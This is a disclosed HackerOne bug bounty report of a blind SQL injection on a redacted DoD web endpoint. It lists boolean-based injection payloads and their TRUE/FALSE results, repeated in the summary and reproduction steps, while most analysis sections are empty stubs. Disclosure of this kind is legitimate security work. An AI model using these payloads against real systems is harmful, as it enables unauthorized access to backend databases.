# Blind SQL iNJECTION 

## Metadata
- **Source:** HackerOne
- **Report:** 1102591 | https://hackerone.com/reports/1102591
- **Submitted:** 2021-02-13
- **Reporter:** 1337n0x
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** medium
- **Vuln:** SQL Injection
- **CVEs:** None
- **Category:** uncategorised

## Summary
Hi DoD Secuirty team ,
i found Blind SQL Injection in this below domain 
https://███████
Proof of concept:
Vuln URL:https://██████████/██████
Pooc:

URL encoded POST input ███ was set to -1' OR 3*2*1=6 AND 1=1 or '4mEwSPwJ'='

Tests performed: 
-1' OR 1=1 or '4mEwSPwJ'=' => TRUE
-1' OR 2=4 or '4mEwSPwJ'=' => FALSE
-1' OR 3*2<(1+2+4) or '4mEwSPwJ'=' => TRUE
-1' OR 3*2>(1+2+4) or '4mEwSPwJ'=' => FAL

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Hi DoD Secuirty team ,
i found Blind SQL Injection in this below domain 
https://███████
Proof of concept:
Vuln URL:https://██████████/██████
Pooc:

URL encoded POST input ███ was set to -1' OR 3*2*1=6 AND 1=1 or '4mEwSPwJ'='

Tests performed: 
-1' OR 1=1 or '4mEwSPwJ'=' => TRUE
-1' OR 2=4 or '4mEwSPwJ'=' => FALSE
-1' OR 3*2<(1+2+4) or '4mEwSPwJ'=' => TRUE
-1' OR 3*2>(1+2+4) or '4mEwSPwJ'=' => FALSE
Poc video :
███

## Impact

It gives the attacker access and control over the backend database server

## System Host(s)
██████████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
..Vuln URL:https://██████/█████
Pooc:

URL encoded POST input ███ was set to -1' OR 3*2*1=6 AND 1=1 or '4mEwSPwJ'='

Tests performed: 
-1' OR 1=1 or '4mEwSPwJ'=' => TRUE
-1' OR 2=4 or '4mEwSPwJ'=' => FALSE
-1' OR 3*2<(1+2+4) or '4mEwSPwJ'=' => TRUE
-1' OR 3*2>(1+2+4) or '4mEwSPwJ'=' => FALSE
Poc video :
█████

## Suggested Mitigation/Remediation Actions




</details>

---
*Analysed by Claude on 2026-05-24*
